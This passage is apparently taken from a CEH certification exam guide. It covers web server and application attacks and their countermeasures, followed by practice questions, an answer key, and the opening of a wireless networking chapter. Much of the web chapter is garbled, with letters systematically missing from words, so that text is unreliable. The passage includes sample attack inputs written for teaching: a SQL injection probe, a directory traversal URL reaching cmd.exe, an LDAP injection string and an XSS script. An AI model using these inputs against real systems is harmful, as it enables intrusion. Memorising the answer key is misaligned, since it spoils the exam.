Sometimes Ethical Hacking Is Depressing
Ofims i wiig, I g io a zo ad jus xcidly sa poudig away o
h kyboad—xcidly lookig up ifomaio o how somhig woks o ad-
ig abou a cool w ool o opio fo us o us. Bu vy oc i a whil, I sa
adig aicls ad g ally bummd ou ov h smig fuiliy of my chos
pofssio. Th aw umbs of wha is sackd agais us a dowigh ifyig.

Fo xampl, l’s jus look a 2020. As dscibd i h Chck Poi Rsach
2020 Cyber Security Report, h sigl lags collcio of bachd psoal
cdials i hisoy, amd “Collcio #1,” was xposd o a cloud svic calld
“MEGA” (hps://www.sc.og/asss/pdfs/cyb-scuiy-po-2020.pdf ). Af
fuh sachig, i was discovd Collcio #1 was bu a small slic of a v
lag 1TB daa lak, spli io sv pas ad disibud hough a daa-adig
schm. Ad ha was jus i January! Th fis half of h ya saw a 50 pc
icas i aacks by mobil bakig malwa, ad cybcim is simad o hav
cos, a a miimum, $1.5 illio i 2020. Fo compaaiv puposs, if ha w a
i couy’s GDP, i’d ak 13h i h wold.

Accodig o Cyb Obsv (hps://www.cyb-obsv.com/cyb-ws-29-
saisics-fo-2020-cyb-obsv/), scuiy bachs hav icasd by 11 pc,
wih a succssful (ijcio h—a known succssful) aack vy 39 scods—
o avag 2,244 ims a day. Ad h icig o his ibl cak? Th avag im
o idify hos bachs was sv mohs. MONTHS. Wa mo? Supply chai
aacks icasd a whoppig 78 pc, 34 pc of all bachs ivolvd som so
of ial aco, ad dspi lially dcads of madaoy aual scuiy aiig
ffos, 92 pc of all malwa (icludig asomwa) aacks w dlivd via
a -mail aachm o lik.

Ad chck ou his lil gm of a soy fom ZDN (hps://www.zd
.com/aicl/you-wbsi-is-ud-cosa-aack/): Th Hoy Pojc, a
iaioal opofi scuiy sach ogaizaio, wih hlp fom suds a
Holbo School, s up a hoypo o ack scuiy aacks o a cloud-basd wb
sv. Th box a o a babos Amazo Wb Svics (AWS) isac, wih o
svics ha would (should) b usful o aybody ls. I did o v hav a domai
am. Sholy af saig h sv, hy sad capuig wok packs fo a
24-hou piod ad h aalyzd h pack capu fil. I a day, his uamd,
almos ivisibl wb sv was aackd mo ha a qua of a millio ims.

06-ch06.indd 268 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

269

Ad ha’s jus h aacks intending o do you ham. A soy fom Wid.com
(hps://www.wid.com/soy/miai-bo-micaf-scam-bough-dow-h-
i/) will jus abou big you o as. O a Fiday afoo i Ocob 2016,
h I slowd o soppd fo aly h i as Uid Sas. Dy, a
compay povidig a ky pa of h I’s backbo, cam ud a DDoS assaul
h liks of which o o had v s bfo: uil h, a lag DDoS aack was
of cosidd o b 10 o 20 Gbps (gigabis p scod), whil a follow-o Miai
aack agais lcom povid OVH hi a whoppig 901 Gbps. Ad wh did i all
com fom? Who w h masmids bhid o of h wold’s mos sophisicad
DDoS aacks i hisoy ad wha w hy ou o gai?

A 21-ya-old Rugs collg sud fom sububa Nw Jsy ad his wo
collg-ag fids admid hi ol i caig ad lauchig “Miai,” as h
bo cam o b kow, io h wold. Why? To gai a advaag i h gam
Micaf. Minecraft…

Thik abou all ha fo a miu. I 24 hous, a o-am, o-ohig VM i
AWS was aackd a qua of a millio ims. Today, almos half you wbsi
visios a bos idig you ill will. Ad somwh i you ogaizaio,
saisically, a las o of you sysms has fall py o som fom of aack
ha you’ pobably complly i h dak abou. Ad kids usig sis o DDoS
oppos i vido gams (ys, ha’s al, you ca acually pay a si o DDoS
som guy playig insert-game-here) ca accidally cippl commuicaios fo
millios of folks.

I’s ough o mak you wod how w ca kp up.
Bu ha’s h challg, fllow scuiy pofssioals. I’s ou bud o ba.

I’s h ol w play i makig ou wold a b plac. So duig hos log days
of viwig cod, o challgig idiculous agums i scuiy valuaio ad
budg migs, o saig a a sc so log you ys dy ou, jus mmb
wha you’ h fo. Bcaus wihou scuiy folks a las ampig o sm h
id, w’d hav all b washd away log ago.

Countermeasures
So, wha’s lf o do wih all hs aacks ad such aimd a ou (by dsig) public-
facig svs? Whil h aack vcos a always chagig ad his wa will v d,
h a a fw coumasus ha ca hlp. Fo xampl, placm of h svs is
xmly impoa. W discussd DMZs, zos, ad fiwalls ali, ad his is wh
ha ifomaio ca b pu io play. Do’ allow accss io you ial wok
fom h public, ad do’ pu svs h public should b accssig i h ial
wok. No oly ca placm avoid aacks, bu i ca limi damag if you svs
w o b xploid.

Kpig up wih scuiy pachig is a absolu cssiy. Ufoualy, v i h
mos imposig of pis woks wh you’d b cai sombody has hi fig

06-ch06.indd 269 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

270

o h puls of pachig, his jus gs ovlookd. Ial fighig ov schduls, wha
pach migh bak which applicaio, ad so o, wid up lavig svs vulabl
o aack. Micosof Basli Scuiy Aalyz (MBSA) usd o b commdd as
a good mas o chck fo missig pachs o a Widows machi by EC-Coucil i
hi couswa (ad sill maks a appaac, by h way, dspi big placd by
Widows Upda), bu i’s caily o h oly o ou h. Ufoualy fom a
scuiy pspciv, discovig ha pachs a missig is’ a issu—gig hm
isalld of is.

NOTE A couple o good web application security scanners you may want to
check out include Syhunt Hybrid (https://www.syhunt.com) and N-Stalker X
(https://www.nstalker.com).

Oh miigaios sm lik commo ss. Tu off ucssay svics, pos, ad
poocols. Rmov oudad, uusd accous ad poply cofigu dfaul accous
ha mus mai. S up appopia fil ad fold pmissios, ad disabl dicoy
lisig as much as possibl. Esu you hav a mas o dc aacks ad o spod o
hm. Th lis gos o ad o. Fom a hackig pspciv, i’s ga ha pachig ad
oh scuiy masus a ih ovlookd o fla ou igod. Rmmb, all you d
is o opig, o cack, ad you pah o succss is laid ou i fo of you.

Chapter Review
Wb ogaizaios assis i a wid aay of ffos o impov h I. IEFT (I
Egiig Task Foc) cas giig docums o hlp mak h I wok
b fom a giig poi of viw. Th IETF’s official docums a publishd
f of chag as RFCs (Rquss fo Comms). Th Wold Wid Wb Cosoium
(W3C) is a iaioal commuiy wh “mmb ogaizaios, a full-im saff,
ad h public wok ogh o dvlop Wb sadads.” W3C gags i ducaio ad
ouach, dvlops sofwa, ad svs as a op foum fo discussio abou h Wb.
OWASP (Op Wb Applicaio Scuiy Pojc) is a 501(c)(3) woldwid o-fo-pofi
chaiabl ogaizaio focusd o impovig h scuiy of sofwa. OWASP publishs
pos, docums, ad aiig ffos o assis i wb scuiy, icludig h “Top 10”
scuiy issus facig wb applicaios ad svs, ad WbGoa (a dlibaly iscu
wb applicaio dsigd o ach wb applicaio scuiy lssos).

Th cu OWASP Top 10 lis icluds A1: Ijcio Flaws, A2: Bok
Auhicaio ad Sssio Maagm, A3: Ssiiv Daa Exposu, A4: XML
Exal Eiis (XXE), A5: Bok Accss Cool, A6: Scuiy Miscofiguaio,
A7: Coss-Si Scipig (XSS), A8: Iscu Dsializaio, A9: Usig Compos
wih Kow Vulabiliis, ad A10: Isuffici Loggig ad Moioig.

Miscofiguaio of wb sv sigs is h mos commo vulabiliy ha
will b xploid. Aas of coc iclud o mssagig, dfaul passwods, SSL
cificas, scips, mo admiisaiv fucios, cofiguaio fils, ad svics
o h machi. Poply cofiguig (sicig?) mo admiisaio, limiaig

06-ch06.indd 270 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

271

ucssay svics, ad chagig ay dfaul passwods o accous a py obvious
bs pacics. Th hpd.cof fil o Apach svs cools aspcs icludig who ca
viw h sv saus pag (which coais ifomaio o h sv, hoss cocd,
ad quss big add o). Th php.ii fil is o you wa o look a fo vbos
o mssagig sig.

Th i sysm is somhig you’ll d o b awa of i wok dsig. N-i
achicu (aka mulii achicu) disibus pocsss acoss mulipl svs. Each
“i” cosiss of a sigl ol caid ou by o (o mo, o v a clus of ) compu
sysms. Typically his is caid ou i “h-i achicu,” wih a psaio i,
logic i, ad daa i, bu h a oh implmaios.

A HTML entity is a way of llig h bows o display cai chaacs i would
ohwis look a as a ag o pa of h pogammig islf. Exampls iclud &nbsp; ad
&lt;. HTTP qus mhods iclud GET, HEAD, POST, PUT, DELETE, TRACE,
ad CONNECT. Boh POST ad GET a cli-sid mhods ha ca b maipulad
wih a wb poxy. Whil GET is visibl i a bows, POST is qually visibl wihi a
good-old Wishak capu. A HTTP HEAD quss hads ad madaa. I woks
xacly lik a HTTP GET, xcp i dos’ u ay body ifomaio o display
wihi you bows. A HTTP GET basically quss daa fom a souc. Howv,
HTTP GET ca b usd o send daa as wll, ad wh sdig daa, h GET mhod
adds the data to the URL.

A POST, o h oh had, is a much b mhod of submiig daa o a souc
fo pocssig. I ca also b usd o lici a spos, bu is pimay pupos is o
povid daa fo h sv o wok wih. POST is gally cosidd saf ha GET
bcaus i is o sod i bows hisoy o cssaily i h sv logs, ad i dos’
display ud daa i h URL.

Th a may aack vcos gadig wb svs: passwod aacks, dial of
svic, ma i h middl (siffig), DNS poisoig (aka hijackig), ad phishig.
DNS amplificaio is a aack maipulaig cusiv DNS o DoS a ag. Th bad
guy uss a bo o amplify DNS asws o h ag uil i ca’ do ayhig ls.

Dicoy avsal is o fom of aack ha’s commo ad succssful, a las o old
svs. I his aack, h hack amps o accss sicd dicois ad xcu
commads ousid idd wb sv dicois. Also kow as h do-do-slash
aack, dicoy climbig, ad backackig, his aack basically sds HTTP quss
askig h sv o dop back o h oo dicoy ad giv accss o oh folds.
This do-do-slash aack is also kow as a vaia of Uicod o uvalidad ipu
aack. Uicod is a sadad fo suig cosis codig ad x psaio
ad ca b accpd by svs fo malicious puposs. Uvalidad ipu mas h
sv has o b cofigud o accp oly spcific ipu duig a HTTP GET, so a
aack ca caf h qus o ask fo commad pomps, o y admiisaiv accss
passwods, ad so o.

Paam o URL ampig ivolvs maipulaig paams wihi h URL
sig i hops of modifyig daa, such as pmissios ad lvaio of pivilgs, pics
ad quaiis of goods, ad cdials. Th ick is o simply look a h URL ad fid
paams you ca adjus ad sd.

06-ch06.indd 271 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

272

Oh wb aacks covd by ECC a faily slf-xplaaoy. A miscofiguaio
aack aks advaag of cofiguaio ims o h sv o big cofigud cocly.
A passwod aack ad a SSH bu-foc aack a xacly wha hy soud lik. Wb
dfacm is wh a aack maliciously als h visual appaac of h pag.

Masploi covs los of opios fo you, icludig xploiaio of kow
vulabiliis ad aackig passwods ov Tl, SSH, ad HTTP. A basic Masploi
xploi modul cosiss of fiv acios: slc h xploi you wa o us, cofigu h
vaious opios wihi h xploi, slc a ag, slc h payload (ha is, wha you
wa o xcu o h ag machi), ad h lauch h xploi. Th famwok bas
accps ipus fom cusom plug-is, ifacs (how you iac wih h famwok),
scuiy ools, wb svics, ad moduls (ach wih is ow spcific pupos).

Wb 2.0 fs o a somwha diff mhod of caig wbsis ad applicaios:
whil 1.0 lis o saic HTML, 2.0 uss “dyamic” wb pags. Bcaus hy’ dyamic
i au, 2.0 apps allow uss o upload ad dowload o a si simulaously, which
povids much b ifasucu fo social mdia ad oh us paicipaio ffos.
P ECC, bcaus Wb 2.0 apps povid fo mo dyamic us paicipaio, hy also
off mo aack sufac.

O succssful wb applicaio aack dals wih ijcig malicious commads io
h ipu sig. Th objciv is much lik ha of h paam-ampig mhods: o
pass xploi cod o h sv hough pooly dsigd ipu validaio i h applicaio.
This ca occu usig a vaiy of diff mhods, icludig file injection (wh h
aack ijcs a poi i h wb fom ipu o a xploi hosd o a mo si),
command injection (wh h aack ijcs commads io h fom filds isad
of h xpcd s y), ad shell injection (wh h aack amps o gai shll
accss usig Java o oh fucios).

LDAP ijcio is a aack ha xplois applicaios ha cosuc LDAP sams
basd o us ipu. I a LDAP ijcio aack, h aack chags wha’s d
io h fom fild by addig h chaacs )(&) af h us am ad h povidig
ay passwod.

SOAP ijcio is aoh lad aack. Simpl Objc Accss Poocol (SOAP) is
dsigd o xchag sucud ifomaio i wb svics i compu woks ad
uss XML o foma ifomaio. You ca ijc malicious quy sigs (much lik SQL
ijcio) ha may allow you o bypass auhicaio ad accss daabass bhid h
scs. SOAP is compaibl wih HTTP ad SMTP, ad mssags a ypically o-way
i au.

A buff ovflow aack, also kow as smashing the stack, is a amp o wi mo
daa io a applicaio’s pbuil buff aa i od o ovwi adjac mmoy,
xcu cod, o cash a sysm (applicaio).

Coss-si scipig (XSS) ivolvs ijcig a scip io a fom fild idd fo
somhig ls. O of h classic aacks of XSS ivolvs gig accss o “docum
.cooki” ad sdig i o a mo hos.

A coss-si qus fogy (CSRF) aack focs a d us o xcu uwad
acios o a wb applicaio o which hy’ culy auhicad. CSRF icks h
vicim io submiig a malicious qus. I ihis h idiy ad pivilgs of h
vicim o pfom a udsid fucio o h vicim’s bhalf. CSRF aacks ca b

06-ch06.indd 272 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

273

miigad by cofiguig a wb sv o sd adom challg oks. If vy us
qus icluds h challg ok, i bcoms asy o spo illgiima quss o
iiiad by h us.

A sssio fixaio aack is somwha simila o CSRF. Th aack logs i o a
lgiima si ad pulls a sssio ID, ad h sds a -mail wih a lik coaiig
h fixd sssio ID. Wh h us clicks i ad logs i o h sam lgiima si, h
hack ca ow log i ad u wih h us’s cdials.

A cookie is a small x-basd fil ha is sod o you sysm fo us by h wb sv
h x im you log i. I ca coai ifomaio such as auhicaio dails, si
pfcs, shoppig ca cos, ad sssio dails. Cookis a s i h had of
a HTTP spos fom a wb sv ad may o may o hav a xpiaio da. Th
oigial i was o povid a coiuous, sabl wb viw fo cusoms ad o mak
higs asi fo u sufs.

SQL ijcio is, by fa, h mos commo ad mos succssful ijcio aack
chiqu i h wold. Sucud Quy Laguag (SQL) is a compu laguag
dsigd fo maagig daa i a laioal daabas sysm. Th laioal daabas is
simply a collcio of abls (cosisig of ows, which hold idividual filds coaiig
daa) id ogh usig som commo fild (ky) ha you ca upda ad quy. Each
abl has a am giv o i ha is fcd wh you pfom quis o updas. SQL
coms io play wh you a addig, dlig, movig, updaig, o viwig h daa
i hos abls ad filds.

SQL quis gally bgi wih h SELECT commad, which is usd o choos
h daa you’d lik o pfom a acio o. I addiio o SELECT, h a sval
addiioal opios ad commads of ga is o a hack. Fo xampl, DROP
TABLE tablename dls h abl tablename fom h daabas. INSERT ad
UPDATE a also asy o udsad.

SQL ijcio occus wh h aack ijcs SQL quis dicly io h ipu
fom. Poply cosucd, h SQL commad bypasss h i of h fo d ad
xcus dicly o h SQL daabas. To fid ou whh a si is suscpibl o SQL
ijcio, chck you ag fo a wb logi pag, ad isad of ig wha’s askd
fo o h wb fom, simply y a sigl quo (') ad s wha kid of o mssag, if
ay, you civ. If ha dos’ wok, y ig anything'or 1=1- ad s wha you
g. Th aack ams ad dfiiios fo SQL a uio quy, auology, blid SQL
ijcio, ad o-basd SQL ijcio.

Th aack calld HTTP spos spliig woks by addig had spos daa o a
ipu fild so h sv splis h spos i a coupl dicios. If i woks, h aack
cools h co of h scod had, which ca b usd fo ay umb of higs,
lik dicig h us o a malicious si h aack us.

A commo mhod of scuiy sig (hackig) a wb applicaio is o simply y
usig i i a ma i which i was’ idd o b usd.

Coumasus fo wb sv ad applicaio aacks iclud coc placm of
h svs ad maiaiig a sog pach maagm ffo. Ohs iclud uig
off ucssay svics, pos, ad poocols; movig oudad, uusd accous ad
poply cofiguig dfaul accous ha mus mai; sig up appopia fil ad
fold pmissios ad disablig dicoy lisig as much as possibl; ad suig you
hav a mas o dc aacks ad o spod o hm.

06-ch06.indd 273 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

274

Sqlmap, Havij, ad sqlija a all auomad scas dsigd o look spcifically
fo ijcio vulabiliis. SQLBu is a ool ha allows you o blas hough
pdfid SQL ijcio quis agais a ag. Ohs ools iclud Pagoli,
SQLExc, Absih, ad BobCa.

Questions
1. You a xamiig log fils ad oic sval cocio amps o a hosd

wb sv. May amps appa as such:
http://www.example.com/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows\
system32\cmd.exe

Wha yp of aack is i us?
A. SQL ijcio
B. Uicod paam ampig
C. Dicoy avsal
D. Coss-si scipig

2. Th accouig dpam of a oli busiss oics sval ods ha
sm o hav b mad oously. I sachig h issu, you discov ha
h pics of ims o sval wb ods do o mach h lisd pics o h
busiss’s public wbsi. You vify ha h wb sv ad h odig daabas
do o sm o hav b compomisd. Addiioally, o als hav displayd i
h So logs cocig a possibl aack o h wb applicaio. Which of h
followig migh xplai h aack i play?
A. Th aack has copid h souc cod o his machi ad ald hidd

filds o modify h puchas pic of h ims.
B. Th aack has usd SQL ijcio o upda h daabas o flc w

pics fo h ims.
C. Th aack has ak advaag of a sv-sid iclud ha ald h pic.
D. Th aack usd Masploi o ak cool of h wb applicaio.

3. A p s am mmb uss h followig y a h commad li:
nmap --script http-methods --script-args somesystem.com

Which of h followig is u gadig h i of h am mmb?
A. Th am mmb is ampig o s which HTTP mhods a suppod

by somsysm.com.
B. Th am mmb is ampig XSS agais somsysm.com.
C. Th am mmb is ampig HTTP spos spliig agais

somsysm.com.
D. Th am mmb is ampig o si-mio somsysm.com.

06-ch06.indd 274 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

275

4. Which of h followig is not commdd as a scuiy masu fo you
wb svs?
A. Esu h is a backou pla fo ay pach o hofix.
B. Block oly hos pos kow as laig o malicious ools ad chiqus.
C. Avoid mappig viual dicois bw svs acoss h wok.
D. Allow mo accss oly wih poply scud cypio/ulig.

5. Which of h followig would b h bs pocio agais XSS aacks?
A. Ivs i op-of-h-li fiwalls.
B. Pfom vulabiliy scas agais you sysms.
C. Cofigu ipu validaio o you sysms.
D. Hav a p s pfomd agais you sysms.

6. Which of h followig is u gadig -i achicu?
A. Each i mus commuica oply wih vy oh i.
B. N-i always cosiss of psaio, logic, ad daa is.
C. N-i is usually implmd o o sv.
D. N-i allows ach i o b cofigud ad modifid idpdly.

7. Which chaac is h bs choic o sa a SQL ijcio amp?
A. Colo
B. Smicolo
C. Doubl quo
D. Sigl quo

8. Cofiguig h wb sv o sd adom challg oks is h bs
miigaio fo which of h followig?
A. XSS aacks
B. Buff ovflow aacks
C. Paam maipulaio aacks
D. CSRF aacks

9. Which of h followig is a u sam?
A. SOAP cao bypass a fiwall.
B. SOAP cyps mssags usig HTTP mhods.
C. SOAP is compaibl wih HTTP ad SMTP.
D. SOAP mssags a usually bidicioal.

06-ch06.indd 275 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

276

10. A aack ipus h followig io h Sach x box o a y fom:
<script type="text/javascript">

alert("It Worked");
</script>

Th aack h clicks h Sach buo ad a pop-up appas saig,
“I Wokd.” Wha ca you if fom his?
A. Th si is vulabl o buff ovflow.
B. Th si is vulabl o SQL ijcio.
C. Th si is vulabl o paam ampig.
D. Th si is vulabl o XSS.

11. SOAP is usd o packag ad xchag ifomaio fo wb svics. Wha dos
SOAP us o foma his ifomaio?
A. XML
B. HTML
C. HTTP
D. Uicod

12. A scuiy admiisao moioig logs coms acoss a us logi amp ha
ads UserJoe)(&). Wha ca you if fom his us am logi amp?
A. Th aack is ampig SQL ijcio.
B. Th aack is ampig LDAP ijcio.
C. Th aack is ampig SOAP ijcio.
D. Th aack is ampig dicoy avsal.

13. A scuiy admiisao ss h HpOly flag i cookis. Which of h followig
is sh mos likly ampig o miiga agais?
A. CSRF
B. CSSP
C. XSS
D. Buff ovflow
E. SQL ijcio

14. You ogaizaio is dployig a w wb-basd sofwa packag quiig
applicaio ad daabas suppo. Th dpam has agd o a h-sv
appoach o mak h svic accssibl fom h I. Of h followig
choics, which would b h bs opio fo sv placm?
A. A wb, applicaio, ad daabas sv o h ial wok oly
B. A wb, applicaio, ad daabas sv facig h I
C. A wb sv facig h I ad a applicaio ad daabas sv o h

ial wok
D. A applicaio ad daabas sv facig h I, wih a wb sv ial

06-ch06.indd 276 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

277

Answers
1. C. This cocio is ampig o avs h dicoy fom h Ipub

folds (i MS IIS svs) o a commad shll fo h aack. Isad of do-
do-slash, Uicod is usd i his xampl o bypass poial IDS sigaus.

2. A. I his cas, bcaus h logs ad IDSs show o dic aack, i’s mos likly
h aack has copid h souc cod dicly o his machi ad ald h
hidd “pic” filds o h od fom. All oh yps of aack would hav, i
som fom o fashio, show hmslvs asily.

3. A. Th hp-mhods scip ss a ag o s wha HTTP mhods a
suppod (by sdig a HTTP OPTIONS qus). Why would a aack do
his? If you kow wha GET, POST, ad PUT do, h you kow h asw o
his qusio alady.

4. B. You should block o disabl vy po ad/o svic ha is o i us.
A “kow malicious po” mas ohig o a advsay, as hy’ll jus as likly
highjack you op bu uusd syslog po.

5. C. “Bs” is always a icky wod i a xam qusio. I his cas, cofiguig
sv-sid opaios o valida wha’s big pu i h ipu fild is by fa h
bs miigaio. Could vulabiliy scas ad p ss ll you somhig is
wog? Su, bu by hmslvs hy do’ do ayhig o poc you.

6. D. Whil usually implmd i h is, -i simply mas you hav h o
mo idpdly moiod, maagd, ad maiaid svs, ach povidig a
spcific svic o askig.

7. D. Th sigl quo should bgi SQL ijcio amps, v hough i may
daabas sysms i’s o always a absolu.

8. D. Th quss fom h bad guy masquadig wih you sssio ID hough
you bows (coss-si qus fogy, CSRF) ca b lagly soppd by makig
su ach qus has a challg ok—if h sv gs o wihou a ok,
i’s dmd bad ad doppd.

9. C. SOAP is compaibl wih HTTP ad SMTP, ad usually h mssags a
“o-way” i au.

10. D. This idicas a coss-si scipig vulabiliy.
11. A. SOAP fomas is ifomaio xchag i XML.
12. B. Th )(&) idicas a LDAP ijcio amp.
13. C. Of h asws povidd, XSS is h oly o ha maks ss. Th HpOly

flag sig pvs cookis fom big accssibl by a cli-sid scip.
14. C. Of h choics povidd ad wih o oh daa, C is h bs opio. You

hav o hav h wb sv availabl fo clis o accss, bu you “back-d”
pocsss should b ial if a all possibl.

06-ch06.indd 277 14/09/21 3:59 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CHAPTER

Wireless Network Hacking 7
In this chapter you will

• Describe wireless network architecture and terminology
• Identiy wireless network types and orms o authentication
• Describe wireless encryption algorithms
• Identiy wireless hacking methods and tools

Part of my Capstone project for college was to interview a C-level manager. Being as I
was in the Air Force and stationed in Germany, that seemed a tall task for me, but I was
successful in convincing the staff that interviewing the communications commander
would be sufficient. After some back and forth in scheduling, I got an interview with the
colonel and we had a great conversation about where networking and data communica-
tions were going, the role security would play in the future, and a host of other topics.

One thing in particular he said stuck with me through the years. We were discussing
how folks outside IT view networking and computing both inside and outside the
military. He paused for a moment and walked over to the wall. He flipped the light
switch on and off and said, “This is where networking is going…and where it needs
to be.” He went on to explain that in his view, networking would soon be no longer
a luxury but a necessity, and people would look at it and expect it to work much like
electricity—just always there and ready, something so ubiquitous and commonplace it’s
taken for granted.

Of course he was dead-on correct, and probably more so than he even knew. If you’d
been there and told us that wireless networking would fit that bill, we would’ve both
probably laughed you out of the room. Today, though, wireless is that ever-present,
always-on, taken-for-granted service we all just expect to be on and ready. Want proof?
Used to be if you invited a group of people over to your house for more than an hour’s
stay, they’d comment on your home, talk about family, friends, and current events, and
just enjoy some face-to-face time. Today, within 30 minutes, someone in the party would
ask, “Hey, what’s your Wi-Fi password?” Shortly thereafter, half the group would be face
down in a smartphone.

Back in the early 1980s, wireless networking didn’t even exist, and the idea was nearly
as far-fetched as the still-cool Star Trek communicators we watched on reruns. Wireless
hacking back then was nothing more than crossing a signal or two, talking over someone
(or listening in to them) on a telephone, or playing with CB or scanner frequencies.

279

07-ch07.indd 279 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

280

Today, we’ve got worlds of wireless to discover and play with. For example, I’d bet your
network at home is still chirping away, even if you’re not there to use it, right? Surely you
didn’t shut it all down before you left for the day….

Not to mention our devices are now more mobile than ever, and getting progressively
smaller...and smarter. Where once mobile security concerns centered on data-at-rest
encryption and pre-shared keys for wireless connectivity on the laptop, the smartphone
is unquestionably the ruler of the airwaves today. People are using smartphones more and
more as their primary networked interaction devices, and we need to focus our attention
appropriately.

Wireless and mobile computing is here to stay, and what a benefit it is to the world.
The freedom and ease of use it offers are wonderful and, truly, are changing our society
day by day. However, along with that we have to use a little caution. If data is sent over
the airwaves, it can be received over the airwaves—by anyone (maybe not in clear text,
and maybe not easily discernable, but it can be received). Therefore, we need to explore
the means of securing our data and preventing accidental spillage. And that, dear reader,
is what this chapter is all about.

Wireless Networking
Although it’s important to remember that any discussion on wireless should include all
wireless mediums (phones, keyboards, and so on), this section is going to focus primar-
ily on wireless data networking. I’m not saying you should forget the rest of the wireless
world—far from it. In the real world you’ll find as many, if not more, hacking oppor-
tunities outside the actual wireless world network. What we do want to spend the vast
majority of our time on, however, are those hacking opportunities that are testable issues.
And, because EC-Council has defined the objectives this way, we will follow suit.

Wireless Terminology, Architecture, and Standards
A wireless network is built with the same concerns as any other media you decide to
use. You have to figure out the physical makeup of the transmitter and receiver (NIC)
and how they talk to one another. There has to be some order imposed on how clients
communicate to avoid collisions and useless chatter. There also must be rules for authen-
tication, data transfer, size of packets, and so on. In the wireless data world, these are all
defined with standards, known as the 802.11 series. Although you probably won’t get
more than a couple of questions on your exam referencing the standards, you still need to
know what they are and basic details about them. Table 7-1 summarize these standards.

One other note of interest when it comes to the standards we’re chatting about here
is the method wireless networks use to encode messages onto the media in use—the
airwaves. In the wired world, we can encode using various properties of the electrical
signal itself (or, if using fiber, the light wave); however, in wireless there’s nothing physical
for the machine to “touch.” Modulation—the practice of manipulating properties of
a waveform—then becomes the encoding method of choice. There are nearly endless
methods of modulating a waveform to carry a signal, but the two you’ll need to know in
wireless are OFDM and DSSS.

07-ch07.indd 280 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

281

Operating
Wireless Standard Speed (Mbps) Frequency (GHz) Modulation Type

802.11a 54 5 OFDM

802.11b 11 2.4 DSSS

802.11d Variation o a and b standards or global use (allowing variations or
power, bandwidth, and so on)

802.11e QoS initiative providing guidance or data and voice prioritization

802.11g 54 2.4 OFDM and DSSS

802.11i WPA / WPA 2 encryption standards

802.11n 100+ 2.4–5 OFDM

802.15.1 (Bluetooth) 25–50 2.4 GFSK, 8DPSK, π/4-
DPSK

802.15.4 (Zigbee) 0.02, 0.04, 0.025 0.868, 0.915, 2.4 O-QPSK, GFSK, BPSK

802.16 (WiMAX) 34–1000 2–11 SOFDMA

Table 7-1 Wireless Standards

Both orthogonal frequency-division multiplexing (OFDM) and direct-sequence
spread spectrum (DSSS) use various pieces of a waveform to carry a signal, but they go
about it in different ways, and the best way I can think to explain it comes in the form of
a discussion about your cable television set. See, the cable plugged into the back of your
TV is capable of carrying several different frequencies of waveforms, and all of them
are plowing into the back of your TV right now. You watch one of these waveforms by
tuning your TV specifically to that channel. (Our tech editor had quite a bit of fun at
my expense over a television with a cable still connected to it. I know, I know—how
1999, right?)

In this oversimplified case, the cable is split into various channels, with each one
carrying a specific waveform. OFDM works in this same manner, with several waveforms
simultaneously carrying messages back and forth. In other words, the transmission media is
divided into a series of frequency bands that don’t overlap each other, and each of them
can then be used to carry a separate signal. DSSS works differently by combining all the
available waveforms into a single purpose. The entire frequency bandwidth can be used
at once for the delivery of a message. Both technologies accomplish the same goal, just
in different ways.

As for a basic wireless network setup, there are two main modes a wireless network
can operate in. The first is ad hoc, which is much like the old point-to-point networks
in the good old days. In ad hoc mode, your system connects directly to another system,
as if a cable were strung between the two. Generally speaking, you shouldn’t see ad hoc
networks appearing very often, but park yourself in any open arena (such as an airport or
bus station) and see how many pop up.

Infrastructure mode is the one most networks are set up as and the one you’ll most
likely be hacking. Whereas ad hoc connects each system one to another, infrastructure
makes use of an access point (AP) to funnel all wireless connections through. A wireless

07-ch07.indd 281 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

282

access point is set up to connect with a link to the outside world (usually some kind of
broadband router). This is an important consideration when you think about it—wireless
devices are usually on completely different subnets than their wired cousins. If you
remember our discussion on broadcast and collision domains, you’ll see quickly why this
is important to know up front.

Clients connect to the access point using wireless network interface cards (NICs); if
the access point is within range and the device understands what it takes to connect, it
is allowed access to the network. Wireless networks can consist of a single access point
or multiple ones, thus creating overlapping “cells” and allowing a user to roam freely
without losing connectivity. This is also an important consideration when we get to the
subject of generating wireless packets later in this chapter. The client needs to “associate”
